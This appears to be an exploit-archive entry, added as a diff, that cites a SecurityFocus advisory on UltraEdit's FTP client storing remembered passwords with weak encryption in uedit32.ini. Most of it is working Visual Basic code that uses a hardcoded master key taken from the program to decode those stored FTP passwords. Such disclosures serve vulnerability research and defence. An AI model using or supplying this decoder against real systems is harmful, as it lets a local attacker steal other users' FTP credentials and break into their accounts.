@@ -1,0 +1,46 @@
+source: http://www.securityfocus.com/bid/3234/info
+
+UltraEdit is a multi-featured commercial text editor with support for HTML, C/C++, VB, Java, Perl, XML, and C#. It also includes a hex editor and a small FTP client.
+
+UltraEdit's FTP client has a feature which will remember FTP passwords for later use. When passwords are remembered they will be stored on the system using an "admittedly" weak encryption algorithm. As a result, it is a fairly trivial task to decrypt the passwords for FTP accounts.
+
+Successful exploitation of this vulnerability will allow a local attacker to gain unauthorized access to the FTP sites used by other local users.
+
+This piece of VB code will decode the passwords stored in uedit32.ini for the FTP accounts
+
+
+' UltraEdit FTP password decryption (stored in uedit32.ini)
+'
+' Taken from the help-file:
+'
+' This checkbox determines if UltraEdit will save the password for later
+' reference. If not the user will be prompted for the password as required. Note
+' ? if the password is saved it is stored on the system. It is encrypted however
+' the encryption mechanism is unsophisticated and should not be relied upon as a
+' method of security.
+
+' Masterkey. Taken from the UltraEdt.exe
+Private Const Masterkey = "sdfkh we;34u[ jwef "
+
+'Decode a single character
+Public Function UEDecode(i_Asc, ByVal i_Pos As Integer)
+
+i_Pos = i_Pos Mod 19
+If i_Pos = 0 Then i_Pos = 19
+
+UEDecode = ((Not i_Asc) And Asc(Mid(Masterkey, i_Pos, 1))) + (i_Asc And ((Not Asc(Mid(Masterkey, i_Pos, 1))) And 127))
+
+End Function
+
+'Decode password
+Public Function UEDecodeString(str_password As String)
+
+Dim i As Integer
+
+UEDecodeString = ""
+
+For i = 1 To (Len(str_password) / 2)
+UEDecodeString = UEDecodeString + Chr$(UEDecode(Val("&H" + Mid(str_password, (2 * (i - 1)) + 1, 2)), i))
+Next i
+
+End Function 
